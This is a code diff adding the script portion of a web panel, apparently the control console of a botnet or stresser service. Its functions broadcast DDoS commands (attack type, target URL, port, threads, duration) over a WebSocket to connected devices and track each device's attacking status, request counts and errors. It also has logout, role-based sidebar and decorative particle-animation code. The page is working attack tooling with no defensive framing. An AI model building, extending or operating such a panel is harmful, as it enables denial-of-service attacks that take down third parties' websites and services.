+                    const ds = deviceStats[data.device_id];
+                    ds.requests = data.requests_sent || 0;
+                    ds.connections = data.connections_active || 0;
+                    ds.errors = data.errors || 0;
+                    ds.running = data.running || false;
+                    renderDeviceTable();
+                    updateAggregatedStats();
+                }
+                break;
+        }
+    }
+
+    function updateAggregatedStats() {
+        let totalReq = 0, totalConn = 0, totalErr = 0, attacking = 0;
+        for (const id in deviceStats) {
+            const d = deviceStats[id];
+            totalReq += d.requests;
+            totalConn += d.connections;
+            totalErr += d.errors;
+            if (d.running) attacking++;
+        }
+        document.getElementById('statDevices').textContent = attacking;
+        document.getElementById('statRequests').textContent = totalReq.toLocaleString();
+        document.getElementById('statConnections').textContent = totalConn;
+        document.getElementById('statErrors').textContent = totalErr.toLocaleString();
+        if (attacking === 0 && isRunning) {
+            isRunning = false;
+            document.getElementById('attackBadge').className = 'status-badge status-idle';
+            document.getElementById('attackBadge').textContent = L('status_stop');
+        }
+    }
+
+    function renderDeviceTable() {
+        const tbody = document.getElementById('deviceTableBody');
+        const ids = Object.keys(deviceStats);
+        if (ids.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:var(--text-gray);">${L('no_connected_devices')}</td></tr>`;
+            return;
+        }
+        tbody.innerHTML = ids.map(id => {
+            const d = deviceStats[id];
+            const offline = d._offline;
+            const dotColor = offline ? '#666' : '#4caf50';
+            const rowOpacity = offline && !d.running ? 'opacity:0.5;' : '';
+            let status;
+            if (d.running) status = `<span style="color:#f44336;">${L('device_attacking')}</span>`;
+            else if (offline) status = `<span style="color:#ff9800;">${L('device_reconnect')}</span>`;
+            else status = `<span style="color:var(--text-gray);">${L('device_waiting')}</span>`;
+            return `<tr style="${rowOpacity}">
+                <td><span class="dot-online" style="background:${dotColor};"></span>${d.model}</td>
+                <td>${status}</td>
+                <td>${(d.requests || 0).toLocaleString()}</td>
+                <td>${d.connections || 0}</td>
+                <td>${(d.errors || 0).toLocaleString()}</td>
+            </tr>`;
+        }).join('');
+    }
+
+    function startBroadcastDdos() {
+        if (!ws || ws.readyState !== WebSocket.OPEN) return;
+        const url = document.getElementById('ddosUrl').value.trim();
+        if (!url) { alert(L('alert_enter_url')); return; }
+        ws.send(JSON.stringify({
+            type: 'ddos_broadcast_start',
+            attack_type: document.getElementById('ddosType').value,
+            url: url,
+            port: parseInt(document.getElementById('ddosPort').value) || 80,
+            threads: parseInt(document.getElementById('ddosThreads').value) || 10,
+            duration: parseInt(document.getElementById('ddosDuration').value) || 60
+        }));
+    }
+
+    function stopBroadcastDdos() {
+        if (!ws || ws.readyState !== WebSocket.OPEN) return;
+        ws.send(JSON.stringify({ type: 'ddos_broadcast_stop' }));
+        for (const id in deviceStats) {
+            deviceStats[id].running = false;
+        }
+        isRunning = false;
+        document.getElementById('attackBadge').className = 'status-badge status-idle';
+        document.getElementById('attackBadge').textContent = L('status_stop');
+        renderDeviceTable();
+    }
+
+    function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('open');
+        document.getElementById('sidebarOverlay').classList.toggle('show');
+    }
+    function closeSidebar() {
+        document.getElementById('sidebar').classList.remove('open');
+        document.getElementById('sidebarOverlay').classList.remove('show');
+    }
+    function logout() {
+        try {
+            localStorage.removeItem('panel_session');
+            localStorage.removeItem('panel_team_id');
+            localStorage.removeItem('panel_login');
+            localStorage.removeItem('panel_role');
+        } catch (e) {}
+        window.location.href = 'login.html';
+    }
+
+    // Init i18n
+    document.getElementById('langToggleBtn').textContent = LANG.toUpperCase();
+    applyI18n();
+
+    if (typeof feather !== 'undefined') feather.replace();
+    connectWs();
+
+    // ========== SIDEBAR USER INFO ==========
+    function updateRoleText() {
+        const userRole = localStorage.getItem('panel_role');
+        const roleEl = document.getElementById('userRole');
+        if (roleEl) roleEl.textContent = userRole === 'ts' ? L('role_ts') : L('role_worker');
+    }
+    (function populateSidebarUser() {
+        try {
+            const userName = localStorage.getItem('panel_display_name')
+                || localStorage.getItem('panel_login')
+                || 'User';
+            const userRole = localStorage.getItem('panel_role');
+            const nameEl = document.getElementById('userName');
+            const avatarEl = document.getElementById('userAvatar');
+            if (nameEl) nameEl.textContent = userName;
+            if (avatarEl) avatarEl.textContent = (userName[0] || 'U').toUpperCase();
+            updateRoleText();
+            if (userRole !== 'ts') {
+                const wNav = document.getElementById('workers-nav-item');
+                const sNav = document.getElementById('settings-nav-item');
+                if (wNav) wNav.style.display = 'none';
+                if (sNav) sNav.style.display = 'none';
+            }
+        } catch (e) {}
+    })();
+
+    // ========== LOGO PARTICLES (shared across all panel pages) ==========
+    (function initSidebarParticles() {
+        const logoCanvas = document.getElementById('logoParticles');
+        if (!logoCanvas) return;
+        const logoCtx = logoCanvas.getContext('2d');
+        let logoParticles = [];
+
+        const animStartTime = parseInt(localStorage.getItem('particleStartTime') || Date.now());
+        if (!localStorage.getItem('particleStartTime')) {
+            localStorage.setItem('particleStartTime', animStartTime);
+        }
+
+        function resizeLogoCanvas() {
+            const container = logoCanvas.parentElement;
+            logoCanvas.width = container.offsetWidth;
+            logoCanvas.height = container.offsetHeight;
+        }
+
+        class LogoParticle {
+            constructor(index) { this.index = index; this.reset(); }
+            reset() {
+                const seed = this.index * 137.5;
+                this.baseX = (Math.sin(seed) * 0.5 + 0.5) * logoCanvas.width;
+                this.baseY = (Math.cos(seed * 2.3) * 0.5 + 0.5) * logoCanvas.height;
+                this.size = (Math.sin(seed * 3.7) * 0.5 + 0.5) * 2 + 1;
+                this.orbitRadius = (Math.sin(seed * 4.1) * 0.5 + 0.5) * 30 + 15;
+                this.orbitSpeed = (Math.sin(seed * 5.3) * 0.5 + 0.5) * 0.5 + 0.3;
+                this.opacity = (Math.sin(seed * 11.7) * 0.5 + 0.5) * 0.5 + 0.3;
+                this.pulseOffset = seed;
+                this.phaseOffset = seed * 0.1;
+            }
+            update(globalTime) {
+                const elapsed = globalTime * 0.001;
+                this.pulse = elapsed * 2 + this.pulseOffset;
+                const angle = elapsed * this.orbitSpeed + this.phaseOffset;
+                this.x = this.baseX + Math.cos(angle) * this.orbitRadius + Math.sin(elapsed * 0.1 + this.phaseOffset) * 20;
+                this.y = this.baseY + Math.sin(angle * 0.7) * this.orbitRadius * 0.6 + Math.cos(elapsed * 0.15 + this.phaseOffset) * 15;
+                if (this.x < -10) this.x += logoCanvas.width + 20;
+                if (this.x > logoCanvas.width + 10) this.x -= logoCanvas.width + 20;
+                if (this.y < -10) this.y += logoCanvas.height + 20;
+                if (this.y > logoCanvas.height + 10) this.y -= logoCanvas.height + 20;
+            }
+            draw() {
+                const pulseOpacity = this.opacity * (0.6 + Math.sin(this.pulse) * 0.4);
+                const gradient = logoCtx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.size * 5);
+                gradient.addColorStop(0, `rgba(230, 57, 70, ${pulseOpacity})`);
+                gradient.addColorStop(0.5, `rgba(230, 57, 70, ${pulseOpacity * 0.3})`);
+                gradient.addColorStop(1, 'transparent');
+                logoCtx.beginPath();
+                logoCtx.arc(this.x, this.y, this.size * 5, 0, Math.PI * 2);
+                logoCtx.fillStyle = gradient;
+                logoCtx.fill();
+                logoCtx.beginPath();
+                logoCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                logoCtx.fillStyle = `rgba(255, 180, 180, ${pulseOpacity})`;
+                logoCtx.fill();
+            }
+        }
+
+        function initLogoParticles() {
+            logoParticles = [];
+            for (let i = 0; i < 15; i++) logoParticles.push(new LogoParticle(i));
+        }
+
+        function animateLogoParticles() {
+            const globalTime = Date.now() - animStartTime;
+            logoCtx.clearRect(0, 0, logoCanvas.width, logoCanvas.height);
+            logoParticles.forEach(p => p.update(globalTime));
+            logoCtx.lineWidth = 0.5;
+            for (let i = 0; i < logoParticles.length; i++) {
+                for (let j = i + 1; j < logoParticles.length; j++) {
+                    const dx = logoParticles[i].x - logoParticles[j].x;
+                    const dy = logoParticles[i].y - logoParticles[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 80) {
+                        const opacity = (1 - dist / 80) * 0.4;
+                        logoCtx.strokeStyle = `rgba(230, 57, 70, ${opacity})`;
+                        logoCtx.beginPath();
+                        logoCtx.moveTo(logoParticles[i].x, logoParticles[i].y);
+                        logoCtx.lineTo(logoParticles[j].x, logoParticles[j].y);
+                        logoCtx.stroke();
+                    }
+                }
+            }
+            logoParticles.forEach(p => p.draw());
+            requestAnimationFrame(animateLogoParticles);
+        }
+
+        resizeLogoCanvas();
+        initLogoParticles();
+        animateLogoParticles();
+        window.addEventListener('resize', () => {
+            resizeLogoCanvas();
+            initLogoParticles();
+        });
+    })();
+</script>
+</body>
+</html>
